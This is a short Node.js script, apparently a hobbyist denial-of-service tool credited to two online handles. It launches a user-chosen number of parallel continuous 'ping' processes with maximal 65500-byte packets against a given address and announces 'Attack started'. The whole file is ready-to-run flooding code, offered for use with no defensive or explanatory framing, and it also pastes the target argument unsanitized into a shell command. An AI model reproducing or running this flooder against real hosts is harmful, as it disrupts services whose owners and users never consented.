// Made by Cedric#0591 and Jonnygaming Tv#2650
// Usage example: node dos.js 127.0.0.1 100

let cp = require("child_process");
let args = process.argv.slice(2);
for (let i = 0; i < args[1]; i++) {
    let child=cp.exec("ping -t -l 65500 "+args[0]);
}
console.log(`Attack started. Address: ${args[0]} Threads: ${args[1]}`);